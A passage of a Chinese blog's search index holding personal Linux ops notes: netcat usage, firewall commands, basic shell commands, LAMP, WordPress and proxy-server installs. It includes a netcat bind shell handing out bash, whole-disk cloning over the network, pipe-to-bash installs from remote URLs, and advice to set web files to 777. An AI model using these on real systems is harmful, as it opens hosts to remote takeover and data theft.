//将收到的文件保存为1.mp4<br>B: nc -vn 1.1.1.1 4444 &lt; 1.mp4 -q 1 // 将1.mp4 发送到1.1.1.1 并在完成后一秒退出</p><p>A —-&gt; B</p><p>A: nc -lp 4444 &lt; 1.mp4 -q 1  //将1.mp4这个文件挂到4444端口并在别人传输完成之后1秒关闭连接<br>B: nc -vn 1.1.1.1 444 &gt; 2.mp4  //下载1.1.1.1的4444端口上的文件并保存为2.mp4</p><h3 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h3><p>A —-&gt; B</p><p>A: tar -cvf - music/ | nc -lp 4444 -q 1  //压缩music文件夹内的所有文件并挂在4444端口<br>B: nc -vn 1.1.1.1 4444 | tar -xvf -   //解压1.1.1.1的4444端口的压缩包并下载</p><h3 id="加密传输文件"><a href="#加密传输文件" class="headerlink" title="加密传输文件"></a>加密传输文件</h3><p>B —-&gt; A</p><p>A: nc -lp 4444 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4  //打开4444端口并设置加密算法为mcrypt并将接受到的文件保存为1.mp4<br>B:mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; 1.mp4 | nc -vn 1.1.1.1 444 -q 1  //解密算法设置为crypt并将接受到的文件保存为1.mp4</p><p>注:mcrypt加密算法未在Kali中预安装,使用apt-get install mcrypt安装</p><p> </p><h3 id="传输流媒体文件"><a href="#传输流媒体文件" class="headerlink" title="传输流媒体文件"></a>传输流媒体文件</h3><p>A —-&gt; B</p><p>A: cat 1.mp4 | nc -lp 4444<br>B: nc -vn 1.1.1.1 4444 | mplayer -vo x11 cache 3000 -</p><p>注:mplayer播放器未在Kali中预安装,使用ape-get install mplayer安装</p><h2 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h2><p>nc -vnz 1.1.1.1 1-65535<br>nc -vnzu 1.1.1.1 1-1024  //扫描1.1.1.1的1-1024端口中开放的UDP端口</p><h2 id="NC——远程磁盘克隆"><a href="#NC——远程磁盘克隆" class="headerlink" title="NC——远程磁盘克隆"></a>NC——远程磁盘克隆</h2><p>A —-&gt; B</p><p>A: nc -lp 4444 | dd of=/dev/sda<br>B:dd if=/dev/sda | nc -vn 1.1.1.1 4444 -q 1</p><h2 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h2><p>B控制A</p><p>A: nc -lp 4444 -c bash  //连接建立完成之后将bash shell给客户端<br>B: nc -vn 1.1.1.1 4444</p><p> </p><h1 id="注-NETCAT不对信息主动加密-升级版NCAT"><a href="#注-NETCAT不对信息主动加密-升级版NCAT" class="headerlink" title="注:NETCAT不对信息主动加密,升级版NCAT"></a>注:NETCAT不对信息主动加密,升级版NCAT</h1>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iptables以及Firewall</title>
      <link href="1afcec1afe30/"/>
      <url>1afcec1afe30/</url>
      
        <content type="html"><![CDATA[<p>转发流量</p><p>wget  -N –no-check-certificate <a href="https://wp.jinzz.cc/wp-content/uploads/iptables-pf.sh">https://wp.jinzz.cc/wp-content/uploads/iptables-pf.sh</a> &amp;&amp; chmod +x iptables-pf.sh<br>bash iptables-pf.sh</p><p> </p><p>Centos开始采用Firewall,不过也是基于Iptables的基础_</p><h2 id="Iptables"><a href="#Iptables" class="headerlink" title="Iptables"></a><strong>Iptables</strong></h2><p>配置文件位置 /etc/sysconfig/iptables</p><p>iptables -A INPUT -p tcp –dport 22 -j ACCEPT<br>iptables -A OUTPUT -p tcp –sport 22 -j ACCEPT</p><h2 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall"></a><strong>Firewall</strong></h2><p>操作命令范例</p><p>firewall-cmd –permanent –zone=public –add-port=80/tcp //添加开放80端口<br>firewall-cmd –permanent –zone=public –remove-port=80/tcp //移除开放80端口</p><p>另外配置方式可以间接修改/etc/firewalld/zones/public.xml文件</p><p>firewall-cmd –permanent –zone=public –add-forward-port=port=2333:proto=tcp:toport=2333:toaddr=192.168.0.152 //端口转发<br>firewall-cmd –complete-reload //保存并且重新启动防火墙</p><p>启动防火墙</p><p>systemctl start firewalld.service</p><p>关闭防火墙</p><p>systemctl stop firewalld.service</p><p>重新启动防火墙</p><p>systemctl restart firewalld.service</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用操作命令</title>
      <link href="375b069ba3d0/"/>
      <url>375b069ba3d0/</url>
      
        <content type="html"><![CDATA[<h2 id="Cd-–进入"><a href="#Cd-–进入" class="headerlink" title="Cd –进入"></a><strong>Cd –进入</strong></h2><p>cd .. //返回上一级</p><p>cd /xx/xx  //进入xx文件夹的xx文件夹,常与Ls搭配使用</p><h2 id="mkdir-–创建文件夹"><a href="#mkdir-–创建文件夹" class="headerlink" title="mkdir –创建文件夹"></a><strong>mkdir –创建文件夹</strong></h2><p>在当前目录下创建一个测试文件夹：mkdir test</p><h2 id="touch-–创建文件"><a href="#touch-–创建文件" class="headerlink" title="touch –创建文件"></a><strong>touch –创建文件</strong></h2><p>在当前目录下创建一个叫test.txt的文件：<code>touch test.txt</code> 在/home目录下创建一个叫demo.txt的文件：<code>touch /home/demo.txt</code></p><h2 id="cp-–复制或重命名"><a href="#cp-–复制或重命名" class="headerlink" title="cp –复制或重命名"></a><strong>cp –复制或重命名</strong></h2><p>将当前目录下的test.txt重全名为demo.txt：<code>cp test.txt demo.txt</code> 复制当前目录下的test.txt到/home目录：<code>cp test.txt /home/</code> 复制当前目录下的test.txt到/home目录并重命名为demo.txt：<code>cp test.txt /home/demo.txt</code> 复制当前目录下的test文件夹所有的东东到/home目录下：<code>cp -R test /home/</code> 复制当前目录下的test文件夹所有的东东到/home目录的demo文件夹下：<code>cp -R test /home/demo</code></p><h2 id="mv-–移动或重命名"><a href="#mv-–移动或重命名" class="headerlink" title="mv –移动或重命名"></a><strong>mv –移动或重命名</strong></h2><p>将当前目录下的test.txt重命名为demo.txt：<code>mv test.txt demo.txt</code> 将当前目录下的test.txt移动到/home目录：<code>mv test.txt /home/</code> 将当前目录下的test.txt移动到/home目录并重命名为demo.txt：<code>mv test.txt /home/demo.txt</code> 将当前目录下的test文件夹所有东东移动到/home目录下：<code>mv test /home/</code> 将当前目录下的test文件夹所有东东移动到/home目录下的demo文件夹下：<code>mv test /home/demo</code> 其实 mv 和 cp 操作很相似。</p><h2 id="rm-–删除文件或文件夹"><a href="#rm-–删除文件或文件夹" class="headerlink" title="rm –删除文件或文件夹"></a><strong>rm –删除文件或文件夹</strong></h2><p>删除当前目录下的test.txt：<code>rm test.txt</code>，之后会提示是否删除，输入Y回车即可 强制删除当前目录下的test.txt：<code>rm -f test.txt</code> 删除当前目录下的test文件夹：<code>rm -r test</code>，之后会提示是否删除，输入Y回车即可 强制删除当前目录的test文件夹：<code>rm -rf test</code> 另外说一下，可能很多新手肯定会被忽悠过去尝试使用<code>rm -rf /*</code>，有些东东就是不能过于好奇。</p><h2 id="Vim-–编辑"><a href="#Vim-–编辑" class="headerlink" title="Vim –编辑"></a><strong>Vim –编辑</strong></h2><p>和vi差不多的文本编辑器,是vi的升级和补完</p><p><strong>按Esc进入操作选择模式</strong></p><p>:wq //write and quit</p><p>:q // quit</p><p>:wq! // write and quit !</p><p>:q! // quit !</p><p>/xxx //在光标下文中寻找xxx</p><p>?xxx //在光标上文中寻找xxx</p><p><strong>按 a/i/o键 进入文本编辑模式</strong></p><p>Pageup和Pagedown可以快速翻页</p><h2 id="Wget-–下载"><a href="#Wget-–下载" class="headerlink" title="Wget –下载"></a><strong>Wget –下载</strong></h2><p>用来从互联网上下东西</p><p>Wget <a href="http://www.jinzz.net/123.zip">http://www.jinzz.net/123.zip</a></p><p>下下来默认保存在root文件夹</p><h2 id="Tar-–压缩与解压缩"><a href="#Tar-–压缩与解压缩" class="headerlink" title="Tar –压缩与解压缩"></a><strong>Tar –压缩与解压缩</strong></h2><p><a href="https://www.91yun.co/archives/138">https://www.91yun.co/archives/138</a></p><p>-c: 建立压缩档案 -x：解压 -t：查看内容 -r：向压缩归档文件末尾追加文件 -u：更新原压缩包中的文件</p><p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。下面的参数是根据需要在压缩或解压档案时可选的。</p><p>-z：有gzip属性的 -j：有bz2属性的 -Z：有compress属性的 -v：显示所有过程 -O：将文件解开到标准输出</p><p>下面的参数-f是必须的</p><p>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p><p># tar -cf all.tar *.jpg 这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。</p><p># tar -rf all.tar *.gif 这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。</p><p># tar -uf all.tar logo.gif 这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。</p><p># tar -tf all.tar 这条命令是列出all.tar包中所有文件，-t是列出文件的意思</p><p># tar -xf all.tar 这条命令是解出all.tar包中所有文件，-t是解开的意思</p><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a><strong>压缩</strong></h3><p>tar -cvf jpg.tar *.jpg //将目录里所有jpg文件打包成tar.jpg</p><p>tar -czf jpg.tar.gz *.jpg   //将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz</p><p>tar -cjf jpg.tar.bz2 *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2</p><p>tar -cZf jpg.tar.Z *.jpg   //将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z</p><p>rar a jpg.rar *.jpg //rar格式的压缩，需要先下载rar for linux</p><p>zip jpg.zip *.jpg //zip格式的压缩，需要先下载zip for linux</p><p><strong>在后面加上/xxx/xxx可以指定路径</strong></p><p><strong>如:tar -cvf <a href="http://www.tar/">www.tar</a> /data/www //将/data/www这个文件夹压缩为<a href="http://www.tar并放在当前目录下/">www.tar并放在当前目录下</a></strong></p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a><strong>解压</strong></h3><p>tar -xvf file.tar //解压 tar包</p><p>tar -xzvf file.tar.gz //解压tar.gz</p><p>tar -xjvf file.tar.bz2   //解压 tar.bz2</p><p>tar -xZvf file.tar.Z   //解压tar.Z</p><p>unrar e file.rar //解压rar</p><p>unzip file.zip //解压zip</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>1、*.tar 用 tar -xvf 解压</p><p>2、*.gz 用 gzip -d或者gunzip 解压</p><p>3、*.tar.gz和*.tgz 用 tar -xzf 解压</p><p>4、*.bz2 用 bzip2 -d或者用bunzip2 解压</p><p>5、*.tar.bz2用tar -xjf 解压</p><p>6、*.Z 用 uncompress 解压</p><p>7、*.tar.Z 用tar -xZf 解压</p><p>8、*.rar 用 unrar e解压</p><p>9、*.zip 用 unzip 解压</p><p> </p><h2 id="CUT-—数据分拣"><a href="#CUT-—数据分拣" class="headerlink" title="CUT —数据分拣"></a><strong>CUT —数据分拣</strong></h2><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171009103605.png"></p><p>cut -d “ “ -f 3 // -d “ “ 理解为divide by 这里的意思是以空格为分割</p><p>// -f 3   理解为field 3  就是以空格为分割的第三块内容</p><p> </p><p> </p><h2 id="UNIQ以及SORT"><a href="#UNIQ以及SORT" class="headerlink" title="UNIQ以及SORT"></a><strong>UNIQ以及SORT</strong></h2><p>uniq 命令不加argment的意思为去掉连续重复的</p><p>sort -u 去掉所有重复的内容</p><p> </p><h2 id="Yum-–安装"><a href="#Yum-–安装" class="headerlink" title="Yum –安装"></a><strong>Yum –安装</strong></h2><p>Yum -y xxx 自动下载安装xxx // -y的意思是自动同意</p><h2 id="Ls-–列出"><a href="#Ls-–列出" class="headerlink" title="Ls –列出"></a><strong>Ls –列出</strong></h2><h2 id="Locate-–低精度查找"><a href="#Locate-–低精度查找" class="headerlink" title="Locate –低精度查找"></a><strong>Locate –低精度查找</strong></h2><p>贼鸡儿好用,和百度感觉差不多,啥东西想不起来在哪了locate一下</p><h2 id="Find-–高精度查找"><a href="#Find-–高精度查找" class="headerlink" title="Find –高精度查找"></a><strong>Find –高精度查找</strong></h2><p>find / -name ‘*vsftpd*‘   //删除所有和vsftpd有关的文件</p><p>其他具体用法不咋了解</p><h2 id="xxx-sh-–运行sh"><a href="#xxx-sh-–运行sh" class="headerlink" title="./xxx.sh –运行sh"></a><strong>./xxx.sh –运行sh</strong></h2><p> </p><h2 id="Linux开机启动项文件"><a href="#Linux开机启动项文件" class="headerlink" title="Linux开机启动项文件"></a><strong>Linux开机启动项文件</strong></h2><p>vim /etc/rc.local</p><p>注:慢慢再被弃用,首先得给这个文件777权限才能正常开机运行</p><h2 id="SCREEN-–命令行终端切换"><a href="#SCREEN-–命令行终端切换" class="headerlink" title="SCREEN –命令行终端切换"></a><strong>SCREEN –命令行终端切换</strong></h2><h4 id="安装-screen"><a href="#安装-screen" class="headerlink" title="安装 screen"></a>安装 screen</h4><p>如果是 centos ：</p><p>yum install -y screen</p><p>如果是 debian 或者 ubuntu ：</p><p>apt-get update apt-get install -y screen</p><h4 id="第二步：在运行长时间的程序之前，先创建一个-screen"><a href="#第二步：在运行长时间的程序之前，先创建一个-screen" class="headerlink" title="第二步：在运行长时间的程序之前，先创建一个 screen"></a>第二步：在运行长时间的程序之前，先创建一个 screen</h4><p> screen -S 随便什么名字</p><p>比如如果是安装 lamp ，你可以写： screen -S lamp   这个后面跟着的只是一个名称，你可以随便取你喜欢的。另外注意，这个参数是大写的 S 。</p><p>创建完，你会看到屏幕清空了，这时你就可以运行你要运行的程序了。</p><h4 id="第三步：如果断开连接后重新连上服务器后，要恢复-screen-的话"><a href="#第三步：如果断开连接后重新连上服务器后，要恢复-screen-的话" class="headerlink" title="第三步：如果断开连接后重新连上服务器后，要恢复 screen 的话"></a>第三步：如果断开连接后重新连上服务器后，要恢复 screen 的话</h4><h5 id="首先查看下-screen-是否正常运行，列出所有-screen-进程："><a href="#首先查看下-screen-是否正常运行，列出所有-screen-进程：" class="headerlink" title="首先查看下 screen 是否正常运行，列出所有 screen 进程："></a>首先查看下 screen 是否正常运行，列出所有 screen 进程：</h5><p>screen -ls</p><p><a href="https://i1.wp.com/www.91yun.org/wp-content/uploads/2016/03/QQ%E5%9B%BE%E7%89%8720160324040945.png?ssl=1"><img src="https://i1.wp.com/www.91yun.org/wp-content/uploads/2016/03/QQ%E5%9B%BE%E7%89%8720160324040945.png?resize=275,155&ssl=1" alt="screen"></a></p><p>你看，我这里正在运行着我的测试一键包。。因为要测试半个小时左右。。。</p><h3 id="恢复某个-screen-进程："><a href="#恢复某个-screen-进程：" class="headerlink" title="恢复某个 screen 进程："></a>恢复某个 screen 进程：</h3><p><a href="https://i2.wp.com/www.91yun.org/wp-content/uploads/2016/03/QQ%E5%9B%BE%E7%89%8720160324041019.png?ssl=1"><img src="https://i2.wp.com/www.91yun.org/wp-content/uploads/2016/03/QQ%E5%9B%BE%E7%89%8720160324041019.png?resize=304,122&ssl=1" alt="screen"></a></p><p>看到没， screen -r 加入前面的进程数字就可以了。我的就是</p><p>screen -r 1225</p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安装部署LAMP</title>
      <link href="a1655009a833/"/>
      <url>a1655009a833/</url>
      
        <content type="html"><![CDATA[<h2 id="L-A-M-P"><a href="#L-A-M-P" class="headerlink" title="L           A             M          P"></a><strong>L           A             M          P</strong></h2><p><strong>Linux    Apache   Mysql    PHP</strong></p><h2 id="下载及安装"><a href="#下载及安装" class="headerlink" title="下载及安装"></a><strong>下载及安装</strong></h2><p><a href="https://lamp.sh/">https://lamp.sh/</a></p><h2 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a><strong>详细步骤</strong></h2><p>yum -y install wget screen unzip</p><p>wget -O lamp.zip <a href="https://github.com/teddysun/lamp/archive/master.zip">https://github.com/teddysun/lamp/archive/master.zip</a></p><p>unzip lamp.zip</p><p>cd lamp-master/</p><p>chmod +x *.sh</p><p>screen -S lamp</p><p>./lamp.sh</p><h2 id="Apache虚拟主机配置使用"><a href="#Apache虚拟主机配置使用" class="headerlink" title="Apache虚拟主机配置使用"></a><strong>Apache虚拟主机配置使用</strong></h2><p>Apache基础配置文件在 /usr/local/apache/conf/httpd.conf //可以增加监听端口</p><p>lamp add   //创建虚拟主机 lamp del    //删除虚拟主机 lamp list    //列出虚拟主机</p><p>创建好的虚拟主机配置文件都在 /usr/local/apache/conf/vhost/xxx.conf</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意!"></a><strong>注意!</strong></h2><p>未对Centos7做出适当优化,需手动增加防火墙规则</p><p>firewall-cmd –permanent –add-port=80/tcp //添加80端口</p><p>firewall-cmd –permanent –add-port=443/tcp //添加443端口</p><h2 id="Mysql管理"><a href="#Mysql管理" class="headerlink" title="Mysql管理"></a><strong>Mysql管理</strong></h2><p>可以通过<a href="http://ip/phpmyadmin%E6%9D%A5%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86">http://ip/phpmyadmin来进行登录管理</a></p><p>如果要通过Navicat等方式连接管理还需要将mysql user表中的localhost改为%</p><h2 id="PHP使用"><a href="#PHP使用" class="headerlink" title="PHP使用"></a><strong>PHP使用</strong></h2><p><em>未涉及,貌似也不会涉及</em></p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安装部署Wordpress</title>
      <link href="d39ff276ea4e/"/>
      <url>d39ff276ea4e/</url>
      
        <content type="html"><![CDATA[<h2 id="前置需安装"><a href="#前置需安装" class="headerlink" title="前置需安装"></a><strong>前置需安装</strong></h2><ul><li><a href="https://codex.wordpress.org/zh-cn:%E6%9C%AF%E8%AF%AD%E8%A1%A8#PHP">PHP</a> 5.2.4或更新版本</li><li><a href="https://codex.wordpress.org/zh-cn:%E6%9C%AF%E8%AF%AD%E8%A1%A8#MySQL">MySQL</a> 5.0或更新版本</li><li>在Apache创建虚拟站点的时候一起创建一个数据库</li></ul><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a><strong>下载地址</strong></h2><p><a href="https://cn.wordpress.org/">https://cn.wordpress.org/</a></p><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a><strong>操作步骤</strong></h2><p>放到网页根目录,访问该站点,填好相关配置,自动生成</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h2><p>刚开始配置好会没有上传权限</p><p>解决方法:在wp_config.php文件里加入</p><p>define(“FS_METHOD”,”direct”); define(“FS_CHMOD_DIR”,0777); define(“FS_CHMOD_FILE”,0777);</p><p>再把根目录所有文件权限设置为777即可</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安装部署酸酸server</title>
      <link href="467c74631145/"/>
      <url>467c74631145/</url>
      
        <content type="html"><![CDATA[<h2 id="V2RAY"><a href="#V2RAY" class="headerlink" title="V2RAY"></a>V2RAY</h2><p>bash &lt;(curl -s -L <a href="https://git.io/v2ray.sh">https://git.io/v2ray.sh</a>)</p><p> </p><h2 id="下载安装地址"><a href="#下载安装地址" class="headerlink" title="下载安装地址"></a><strong>下载安装地址</strong></h2><p><a href="https://teddysun.com/486.html">https://teddysun.com/486.html</a></p><h2 id="纯python版安装"><a href="#纯python版安装" class="headerlink" title="纯python版安装"></a><strong>纯python版安装</strong></h2><p>wget –no-check-certificate -O shadowsocks.sh <a href="https://raw.githubusercontent.com/teddysun/shadowsocks/_install/master/shadowsocks.sh">https://raw.githubusercontent.com/teddysun/shadowsocks\_install/master/shadowsocks.sh</a><br>chmod +x shadowsocks.sh<br>./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a><strong>安装步骤</strong></h2><p>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/shadowsocks/_install/master/shadowsocks-all.sh">https://raw.githubusercontent.com/teddysun/shadowsocks\_install/master/shadowsocks-all.sh</a><br>chmod +x shadowsocks-all.sh<br>./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</p><p>简单的一B,自己照着后面提示来就行了</p><p><strong>启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。</strong></p><p>Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status</p><p>ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status</p><p>Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status</p><p>Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status</p><h2 id="各版本默认配置文件"><a href="#各版本默认配置文件" class="headerlink" title="各版本默认配置文件"></a><strong>各版本默认配置文件</strong></h2><p>Shadowsocks-Python 版： /etc/shadowsocks-python/config.json</p><p>ShadowsocksR 版： /etc/shadowsocks-r/config.json</p><p>Shadowsocks-Go 版： /etc/shadowsocks-go/config.json</p><p>Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
